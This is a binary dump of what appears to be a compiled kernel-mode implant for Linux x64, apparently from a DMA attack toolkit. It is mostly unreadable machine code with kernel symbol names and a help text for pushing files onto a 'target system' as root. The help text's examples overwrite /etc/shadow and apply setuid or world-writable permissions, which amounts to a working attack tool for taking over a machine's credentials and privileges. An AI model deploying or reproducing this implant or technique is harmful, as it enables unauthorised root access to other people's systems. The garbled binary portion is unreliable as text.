7�<+�& ?��Bw(�l�F��u1��we�n�~��@��       �      C      d                                       VH��H���H�� �G  H��^�AWAVAUATL��L��M��I��M��I��I��K�T5 �#   H��tK�D% M��u�A\A]A^A_H��   �H3��H��WVH��I��I��H�L$8L�D$@L�L$HAWL��H���H�� ��I��A_^_�H�     ���H��H�     ���H+�H��H��H������@UH��H��pH�I3��E�L�EH�U�H�E��E�filpH�E�A�   H�E��E�_cloH�E�H�E�H�E�H�EH�E�f�E�se�E�filp�E�_opef�E�n �E�vfs_�E�writf�E�e �Ememcf�Epy�����H��p]���H�\$WH��PH�d$` H��H��(   u�  �H��   �   H�T$0�0�����u�  �H��   �   H�L$HH��   L��H��   A�  ����L��   A�A  H�L$8H������H��H�    ����H;�v�  ��L��  H�D$`LG(H��L��   H�L$@H�D$ �@���H�L$0E3�H��H��(  �)���H�\$hH��P_�PUSH FILES TO TARGET SYSTEM                                     
LINUX X64 EDITION                                               
=============================================================== 
Push a file from the local system to the target system.         
WARNING! Existing files will be overwritten!                    
* Files created will be created with root as owner/group and get 
  the access mask specified in the -0 parameter.                
* Files overwritten will keep the access mask and owner/group.  
REQUIRED OPTIONS:                                               
  -in  : file to push to target system from this system.        
         filename is given in normal format.                    
         Example: '-in c:\temp\shadow'                          
  -s : file on target system.                                   
         Example: '-s /etc/shadow'                              
  -0   : file access mask in HEXADECIMAL OR DECIMAL FORMAT!     
         NB! linux file masks are ususally typed in octal -     
         -rwsr-xr-x 4755 (oct) = 2541 (decimal) = 0x9ed (hex)   
         -rwxrwxrwx  777 (oct) =  511 (decimal) = 0x1ff (hex)   
         Example: '-0 0x1ff'                                    
  -1   : run flag - set to non zero to push file.               
===== PUSH ATTEMPT DETAILED RESULT INFORMATION ================ 
FILE NAME     : %s 
RESULT CODE   : 0x%08X 
BYTES WRITTEN : 0x%08X 
=============================================================== 
 